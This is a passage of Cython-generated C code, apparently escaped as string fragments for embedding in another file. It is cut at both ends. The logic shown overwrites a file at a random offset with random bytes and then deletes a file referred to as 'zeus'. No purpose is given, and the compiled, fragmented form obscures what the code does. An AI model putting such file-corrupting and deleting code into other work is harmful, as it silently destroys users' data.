(unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n          __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_11);\\n          __Pyx_GIVEREF(__pyx_t_15);\\n          PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_15);\\n          __Pyx_GIVEREF(__pyx_t_2);\\n          PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_2);\\n          __pyx_t_15 = 0;\\n          __pyx_t_2 = 0;\\n          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_11, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L5_\"\"error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n          __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_7);\\n          __pyx_t_11 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 14, __pyx_L25_error)\\n          __Pyx_GOTREF(__pyx_t_11);\\n          __pyx_t_15 = __Pyx_PyObject_CallNoArg(__pyx_t_11); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 14, __pyx_L25_error)\\n          __Pyx_GOTREF(__pyx_t_15);\\n          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n          __pyx_t_11 = __pyx_t_15;\\n          __pyx_t_15 = 0;\\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n          /*try:*/ {\\n            {\\n              __Pyx_PyThreadState_declare\\n   ""           __Pyx_PyThreadState_assign\\n              __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_9, &__pyx_t_8);\\n              __Pyx_XGOTREF(__pyx_t_10);\\n              __Pyx_XGOTREF(__pyx_t_9);\\n              __Pyx_XGOTREF(__pyx_t_8);\\n              /*try:*/ {\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_D, __pyx_t_11) < 0) __PYX_ERR(0, 14, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_D); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 15, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_read); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 15, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_ss, \"\"__pyx_t_11) < 0) __PYX_ERR(0, 15, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_ss); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 16, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_16 = PyObject_Length(__pyx_t_11); if (unlikely(__pyx_t_16 == ((Py_ssize_t)-1))) __PYX_ERR(0, 16, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __pyx_t_11 = PyInt_FromSsize_t(__pyx_t_16); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 16, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_pp, __pyx_t_11) < 0) __PYX_ERR(0, 16, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n""\\n                __pyx_t_11 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 17, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_11) < 0) __PYX_ERR(0, 17, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_random); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_pp); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_15 = PyTuple_New(2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_15);\\n                __Pyx_INCREF(__pyx_int_0);\\n                __Pyx_GIVEREF(__\"\"pyx_int_0);\\n                PyTuple_SET_ITEM(__pyx_t_15, 0, __pyx_int_0);\\n                __Pyx_GIVEREF(__pyx_t_11);\\n                PyTuple_SET_ITEM(__pyx_t_15, 1, __pyx_t_11);\\n                __pyx_t_11 = 0;\\n                __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_15, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_ase, __pyx_t_11) < 0) __PYX_ERR(0, 18, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_os); if (unlikely(!__pyx_t_11)) __PY""X_ERR(0, 19, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_urandom); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 19, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_15);\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 19, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_rndm, __pyx_t_11) < 0) __PYX_ERR(0, 19, __pyx_L29_error)\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_D); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 20, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_seek); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 20, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_15);\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_GetModuleGlobalName(\"\"__pyx_t_11, __pyx_n_s_ase); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 20, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_15, __pyx_t_11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_D); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlik""ely(!__pyx_t_11)) __PYX_ERR(0, 21, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rndm); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __pyx_t_15 = __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 21, __pyx_L29_error)\\n                __Pyx_GOTREF(__pyx_t_15);\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n\\n\\n              }\\n              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\\n              __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\\n              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\\n              goto __pyx_L34_try_end;\\n              __pyx_L29_error:;\\n              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n           \"\"   /*except:*/ {\\n                __Pyx_AddTraceback(\\\"source\\\", __pyx_clineno, __pyx_lineno, __pyx_filename);\\n                if (__Pyx_GetException(&__pyx_t_15, &__pyx_t_2, &__pyx_t_11) < 0) __PYX_ERR(0, 14, __pyx_L31_except_error)\\n                __Pyx_GOTREF(__pyx_t_15);\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __pyx_t_1 = PyTuple_Pack(3, __pyx_t_15, __pyx_t_2, __pyx_t_11); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L31_except_error)\\n                __Pyx_GOTREF(__pyx_t_1);\\n                __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_1, NULL);\\n                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n                __Pyx_DECR""EF(__pyx_t_1); __pyx_t_1 = 0;\\n                if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 14, __pyx_L31_except_error)\\n                __Pyx_GOTREF(__pyx_t_12);\\n                __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_12);\\n                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\\n                if (__pyx_t_14 < 0) __PYX_ERR(0, 14, __pyx_L31_except_error)\\n                __pyx_t_13 = ((!(__pyx_t_14 != 0)) != 0);\\n                if (__pyx_t_13) {\\n                  __Pyx_GIVEREF(__pyx_t_15);\\n                  __Pyx_GIVEREF(__pyx_t_2);\\n                  __Pyx_XGIVEREF(__pyx_t_11);\\n                  __Pyx_ErrRestoreWithState(__pyx_t_15, __pyx_t_2, __pyx_t_11);\\n                  __pyx_t_15 = 0; __pyx_t_2 = 0; __pyx_t_11 = 0;\\n                  __PYX_ERR(0, 14, __pyx_L31_except_error)\\n                }\\n                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                goto __pyx_L30_exception_handled;\\n              }\\n              __pyx_L31_except_error:;\\n              __Pyx_XGIVEREF(__pyx_t_10);\\n              __Pyx_XGIVEREF(__pyx_t_9);\\n              __Pyx_XGIVEREF(__pyx_t_8);\\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx\"\"_t_9, __pyx_t_8);\\n              goto __pyx_L5_error;\\n              __pyx_L30_exception_handled:;\\n              __Pyx_XGIVEREF(__pyx_t_10);\\n              __Pyx_XGIVEREF(__pyx_t_9);\\n              __Pyx_XGIVEREF(__pyx_t_8);\\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_9, __pyx_t_8);\\n              __pyx_L34_try_end:;\\n            }\\n          }\\n          /*finally:*/ {\\n            /*normal exit:*/{\\n              if (__pyx_t_7) {\\n                __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple_, NULL);\\n                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n                if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 14, __pyx_L5_error)\\n        ""        __Pyx_GOTREF(__pyx_t_8);\\n                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\\n              }\\n              goto __pyx_L28;\\n            }\\n            __pyx_L28:;\\n          }\\n          goto __pyx_L38;\\n          __pyx_L25_error:;\\n          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n          goto __pyx_L5_error;\\n          __pyx_L38:;\\n        }\\n\\n\\n      }\\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\\n      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\\n      goto __pyx_L10_try_end;\\n      __pyx_L5_error:;\\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n\\n\\n      __pyx_t_17 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));\\n      if (__pyx_t_17) {\\n        __Pyx_AddTraceback(\\\"source\\\", __pyx_clineno, __pyx_lineno, __pyx_filename);\\n        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_2, &__pyx_t_15) < 0) __PYX_ERR(0, 22, __pyx_L7_except_error)\\n        __Pyx_GOTREF(__pyx_t_11);\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_GOTREF(__pyx_t_15);\\n        if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_t_2) < 0) __PY\"\"X_ERR(0, 22, __pyx_L7_except_error)\\n        /*try:*/ {\\n\\n\\n          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_E); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L44_error)\\n          __Pyx_GOTREF(__pyx_t_1);\\n          __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 23, __pyx_L44_error)\\n          __Pyx_GOTREF(__pyx_t_6);\\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        }\\n\\n\\n        /*finally:*/ {\\n          /*normal exit:*/{\\n            if (unlikely(__Pyx_PyObject_DelAttr""Str(__pyx_m, __pyx_n_s_E) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 22, __pyx_L7_except_error) }\\n            goto __pyx_L45;\\n          }\\n          __pyx_L44_error:;\\n          /*exception exit:*/{\\n            __Pyx_PyThreadState_declare\\n            __Pyx_PyThreadState_assign\\n            __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_9 = 0; __pyx_t_10 = 0; __pyx_t_12 = 0; __pyx_t_20 = 0;\\n            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n            if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_10, &__pyx_t_12, &__pyx_t_20);\\n            if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9) < 0)) __Pyx_ErrFetch(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);\\n            __Pyx_XGOTREF(__pyx_t_7);\\n            __Pyx_XGOTREF(__pyx_t_8);\\n            __Pyx_XGOTREF(__pyx_t_9);\\n            __Pyx_XGOTREF(__pyx_t_10);\\n            __Pyx_XGOTREF(__pyx_t_12);\\n            __Pyx_XGOTREF(__pyx_t_20);\\n            __pyx_t_17 = __pyx_lineno; __pyx_t_18 = __pyx_clineno; __pyx_t_19 = __pyx_filename;\\n            {\\n              if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_E) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 22, __pyx_L49_error) }\\n            }\\n      \"\"      if (PY_MAJOR_VERSION >= 3) {\\n              __Pyx_XGIVEREF(__pyx_t_10);\\n              __Pyx_XGIVEREF(__pyx_t_12);\\n              __Pyx_XGIVEREF(__pyx_t_20);\\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_12, __pyx_t_20);\\n            }\\n            __Pyx_XGIVEREF(__pyx_t_7);\\n            __Pyx_XGIVEREF(__pyx_t_8);\\n            __Pyx_XGIVEREF(__pyx_t_9);\\n            __Pyx_ErrRestore(__pyx_t_7, __pyx_t_8, __pyx_t_9);\\n            __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_9 = 0; __pyx_t_10 = 0; __pyx_t_12 = 0; __pyx_t_20 = 0;\\n            __pyx_lineno = __pyx_t""_17; __pyx_clineno = __pyx_t_18; __pyx_filename = __pyx_t_19;\\n            goto __pyx_L7_except_error;\\n            __pyx_L49_error:;\\n            if (PY_MAJOR_VERSION >= 3) {\\n              __Pyx_XGIVEREF(__pyx_t_10);\\n              __Pyx_XGIVEREF(__pyx_t_12);\\n              __Pyx_XGIVEREF(__pyx_t_20);\\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_12, __pyx_t_20);\\n            }\\n            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\\n            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\\n            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\\n            __pyx_t_10 = 0; __pyx_t_12 = 0; __pyx_t_20 = 0;\\n            goto __pyx_L7_except_error;\\n          }\\n          __pyx_L45:;\\n        }\\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n        goto __pyx_L6_exception_handled;\\n      }\\n      goto __pyx_L7_except_error;\\n      __pyx_L7_except_error:;\\n\\n\\n      __Pyx_XGIVEREF(__pyx_t_3);\\n      __Pyx_XGIVEREF(__pyx_t_4);\\n      __Pyx_XGIVEREF(__pyx_t_5);\\n      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);\\n      goto __pyx_L3_error;\\n      __pyx_L6_exception_handled:;\\n      __Pyx_XGIVEREF(__pyx_t_3);\\n      __Pyx_XGIVEREF(__pyx_t_4);\\n      __Pyx_XGIVEREF(__pyx_t_5);\\n      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);\\n      __pyx_L10_try_end:;\\n    }\\n  }\\n\\n\\n  /*fina\"\"lly:*/ {\\n    /*normal exit:*/{\\n      {\\n        __Pyx_PyThreadState_declare\\n        __Pyx_PyThreadState_assign\\n        __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);\\n        __Pyx_XGOTREF(__pyx_t_5);\\n        __Pyx_XGOTREF(__pyx_t_4);\\n        __Pyx_XGOTREF(__pyx_t_3);\\n        /*try:*/ {\\n\\n\\n          __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_os); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_GOTREF(__pyx_t_15);\\n          __pyx_t_2 = __Pyx_PyObject_GetAttrSt""r(__pyx_t_15, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n          __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_exists); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_GOTREF(__pyx_t_15);\\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_zeus); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __pyx_t_11 = __Pyx_PyObject_CallOneArg(__pyx_t_15, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_GOTREF(__pyx_t_11);\\n          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n          __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_11); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 26, __pyx_L50_error)\\n          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n          if (__pyx_t_13) {\\n\\n\\n            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 27, __pyx_L50_error)\\n            __Pyx_GOTREF(__pyx_t_11);\\n            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_remove); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L50_error)\\n            __Pyx_GOTREF(__pyx_t_2);\\n            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n            __Pyx_GetModu\"\"leGlobalName(__pyx_t_11, __pyx_n_s_zeus); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 27, __pyx_L50_error)\\n            __Pyx_GOTREF(__pyx_t_11);\\n            __pyx_t_15 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_11); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 27, __pyx_L50_error)\\n            __Pyx_GOTREF(__pyx_t_15);\\n            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n""\\n\\n          }\\n\\n\\n        }\\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\\n        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\\n        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\\n        goto __pyx_L55_try_end;\\n        __pyx_L50_error:;\\n        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n\\n\\n        __pyx_t_18 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);\\n        if (__pyx_t_18) {\\n          __Pyx_ErrRestore(0,0,0);\\n          goto __pyx_L51_exception_handled;\\n        }\\n        goto __pyx_L52_except_error;\\n        __pyx_L52_except_error:;\\n\\n\\n        __Pyx_XGIVEREF(__pyx_t_5);\\n        __Pyx_XGIVEREF(__pyx_t_4);\\n        __Pyx_XGIVEREF(__pyx_t_3);\\n        __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);\\n        goto __pyx_L1_error;\\n        __pyx_L51_exception_handled:;\\n        __Pyx_XGIVEREF(__pyx_t_5);\\n        __Pyx_XGIVEREF(__pyx_t_4);\\n        __Pyx_XGIVEREF(__pyx_t_3);\\n        __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);\\n        __pyx_L55_try_end:;\\n      }\\n      goto __pyx_L4;\\n    }\\n    __pyx_L3_error:;\\n    /*exception exit:*/{\\n      __Pyx_PyThreadState_declare\\n      __Pyx_PyThreadState_assign\\n      __pyx_t_3 = 0; __pyx_t_4 = 0; __pyx_t_5 = 0; __pyx_t_20 = 0; __pyx_t_12 = 0; __pyx_t_10 = 0;\\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0\"\";\\n      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n      if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_20, &__pyx_t_12, &__pyx_t_10);\\n      if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5) < 0)) __Pyx_ErrFetch(&__pyx_t_3, ""&__pyx_t_4, &__pyx_t_5);\\n      __Pyx_XGOTREF(__pyx_t_3);\\n      __Pyx_XGOTREF(__pyx_t_4);\\n      __Pyx_XGOTREF(__pyx_t_5);\\n      __Pyx_XGOTREF(__pyx_t_20);\\n      __Pyx_XGOTREF(__pyx_t_12);\\n      __Pyx_XGOTREF(__pyx_t_10);\\n      __pyx_t_18 = __pyx_lineno; __pyx_t_17 = __pyx_clineno; __pyx_t_21 = __pyx_filename;\\n      {\\n        {\\n          __Pyx_PyThreadState_declare\\n          __Pyx_PyThreadState_assign\\n          __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_8, &__pyx_t_7);\\n          __Pyx_XGOTREF(__pyx_t_9);\\n          __Pyx_XGOTREF(__pyx_t_8);\\n          __Pyx_XGOTREF(__pyx_t_7);\\n          /*try:*/ {\\n\\n\\n            __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_os); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 26, __pyx_L59_error)\\n            __Pyx_GOTREF(__pyx_t_15);\\n            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_path); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 26, __pyx_L59_error)\\n            __Pyx_GOTREF(__pyx_t_11);\\n            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n            __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_exists); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 26, __pyx_L59_error)\\n            __Pyx_GOTREF(__pyx_t_15);\\n            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_zeus); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 26, __pyx_L59_error)\\n            __Pyx_GOTREF(__pyx_t_11);\\n            __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_15, __pyx_t_11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L59_error)\\n          \"\"  __Pyx_GOTREF(__pyx_t_2);\\n            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 26, __pyx_L59_error)\\n            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n            if (__pyx_t_13) {\\n\\n\\n              